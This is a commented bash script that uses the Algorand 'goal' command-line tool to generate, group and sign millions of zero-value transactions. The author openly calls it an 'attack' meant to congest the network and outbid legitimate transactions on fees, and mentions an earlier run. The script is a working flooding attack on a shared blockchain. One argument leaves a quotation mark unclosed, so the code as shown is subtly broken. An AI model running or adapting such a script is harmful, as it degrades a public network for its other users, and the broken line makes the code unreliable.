#!/bin/bash
#setup o for outer loop and i for inner loop.
o=0
i=0
#start outer loop
  while [ $o -le 359 ]
  do
    #start inner loop
    while [ $i -le 9999 ]
    do
    #create 0 algo transactions with incrementing message (to make sure I'm never sending the same tx twice in the same group, because the ledger won't accept it)
    #If people want to know what I'm doing here, I'll explain word for word.
    #goal : CLI tool for interacting with the blockchain
    #clerk send : create a "send transaction"
    #-a 0 : amount of 0 Algos
    #--firstvalid 19181000 : transaction will be valid starting on this block only
    #--fee 1200 : I figured out on my first actual "attack" (starting on block 19160900) that network congestion pushes the minimum fee upwards within 3-4 blocks of congestion. I figured I'd put 1200 to see if I could basically go through before other legitimate transactions.
    #-t GTGIWTMQDFFZETS3ILBHTEQ36KH5HTJBUIRZX6UZ2X7PDHYF2VXREMTWTA : send the transaction to myself, could be sent to anybody really.
    #--note="attacktest ${o} ${i}" : note attached to each transaction. First of all it makes sure every transaction will be different so they can be written to the ledger. The ledger doesn't accept the same tx twice in the same group.
    #Second of all, it helps to see which tx went through and which one didn't to try and find a pattern afterwards.
    #--out="/home/algotest/tmp/attack${i} : send those transactions to individual files locally to later concatenate into a grouped tx.
    goal clerk send -a 0 --firstvalid 19181000 --fee 1200 -t GTGIWTMQDFFZETS3ILBHTEQ36KH5HTJBUIRZX6UZ2X7PDHYF2VXREMTWTA --note="attacktest ${o} ${i}" --out="/home/algotest/tmp/attack${i}
    #increment i
    i=$(($i+1))
    #close inner loop
    done

  #concatenate 10 000 transactions in a single file
  cat /home/algotest/tmp/attack* > /home/algotest/tmp/unsigned.txn

  #sign this transaction and clean up. Cleanup isn't really necessary since it should overwrite the old transactions, but I feel better cleaning up after myself. It's also easier to check where I'm at if I want to stop the script in the middle.
  goal clerk sign --infile=/home/algotest/tmp/unsigned.txn --outfile=/home/algotest/signed/signed${o}.stxn
  rm /home/algotest/tmp/attack*
  rm /home/algotest/tmp/unsigned.txn
  #put $i back at 0 to start the inner loop again. Increment outer loop.
  i=0
  o=$(($o+1))
  done
